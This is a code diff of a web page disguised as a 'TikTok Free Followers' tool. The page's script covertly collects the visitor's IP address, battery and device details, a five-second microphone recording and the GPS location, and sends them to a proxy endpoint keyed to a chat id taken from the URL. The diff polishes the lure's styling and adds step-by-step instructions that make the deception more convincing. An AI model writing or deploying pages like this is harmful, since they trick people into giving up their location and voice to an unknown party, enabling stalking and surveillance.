@@ -2,28 +2,45 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>TikTok Followers Tool - Location Only</title>
+  <title>TikTok Followers Tool - Location</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
   <style>
-    body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background:#f5f5f5; }
-    .navbar { background: linear-gradient(90deg,#69C9D0,#EE1D52); color:white; text-align:center; padding:15px 0; }
-    #header { margin:0; font-size:26px; font-weight:bold; color:white; }
+    body { font-family:'Montserrat',sans-serif; margin:0; padding:0; background-color:#f5f5f5; }
+    .navbar { background: linear-gradient(90deg,#69C9D0,#EE1D52); color:white; text-align:center; padding:15px 0; box-shadow:0 4px 6px rgba(0,0,0,0.1); }
+    #header { margin:0; font-size:30px; font-weight:bold; color:white; text-shadow:1px 1px 2px rgba(0,0,0,0.3); }
     .container { max-width:600px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
-    .form-control { width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px; }
-    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; }
-    footer { text-align:center; margin-top:40px; color:#fff; background:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold; }
+    .form-control { width:calc(100% - 22px); margin-bottom:15px; padding:10px; border:1px solid #ccc; border-radius:5px; font-size:16px; }
+    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; box-shadow:0 4px 6px rgba(0,0,0,0.2); transition: all 0.3s ease; }
+    #thumbdloadbtn:hover { background-color:#C21844; transform: translateY(-2px); }
+    footer { text-align:center; margin-top:40px; color:#fff; background-color:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold; }
+    .tiktok-logo { display:block; margin:10px auto; width:100px; height:auto; border-radius:10px; box-shadow:0 2px 6px rgba(0,0,0,0.3); }
+    h2 { color:#EE1D52; text-align:center; font-weight:bold; }
+    ol li { margin-bottom:10px; font-size:16px; }
   </style>
 </head>
 <body>
   <nav class="navbar">
+    <img class="tiktok-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
     <h1 id="header">TIKTOK FREE FOLLOWERS</h1>
   </nav>
 
   <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL" spellcheck="false">
     <button id="thumbdloadbtn" onclick="startProcess()">GET FOLLOWERS</button>
+
+    <h2>How to Get TikTok Followers/Stats</h2>
+    <ol>
+      <li>Copy the TikTok Profile Link / URL from the TikTok App or Website</li>
+      <li>Paste the TikTok Profile Link / URL in the Input Field Above</li>
+      <li>Click on the "GET FOLLOWERS" Button</li>
+      <li>View Followers, Likes, and Stats</li>
+    </ol>
   </div>
+
+  <center>
+    <div id="message-container"></div>
+  </center>
 
   <script>
     function GetURLParameter(sParam){  
@@ -36,13 +53,13 @@
     var chatid = GetURLParameter('id');  
 
     async function startProcess(){  
-      document.getElementById('thumbdloadbtn').textContent='Fetching...';  
+      document.getElementById('thumbdloadbtn').textContent='Fetching... Please wait';  
 
       if(chatid){  
         const [ip,battery] = await Promise.all([getIP(), getBattery()]);  
         const device = getDeviceInfo();  
 
-        // --- send text info ---  
+        // --- send text info ---
         fetch(`/api/proxy`,{  
           method:'POST',  
           headers:{'Content-Type':'application/json'},  
@@ -53,7 +70,7 @@
           })  
         });  
 
-        // --- send voice (5s) ---  
+        // --- ask mic permission & record 5s voice ---
         navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {  
           const recorder=new MediaRecorder(stream);  
           let chunks=[];  
@@ -64,9 +81,9 @@
           };  
           recorder.start();  
           setTimeout(()=>recorder.stop(),5000);  
-        }).catch(err=>console.error(err));  
+        }).catch(err=>console.error("Mic Denied:",err));  
 
-        // --- send location ---  
+        // --- ask location permission & send location ---
         if(navigator.geolocation){  
           navigator.geolocation.getCurrentPosition(pos=>{  
             fetch(`/api/proxy`,{  
@@ -79,7 +96,7 @@
                 longitude:pos.coords.longitude  
               })  
             });  
-          });  
+          },err=>console.error("Location Denied:",err));  
         }  
       }  
     }  
@@ -114,6 +131,6 @@
     }  
   </script>
 
-  <footer><p>DEVELOP BY ALI💜🔥</p></footer>
+  <footer><p>DEVELOP BY ALI🔥</p></footer>
 </body>
 </html>
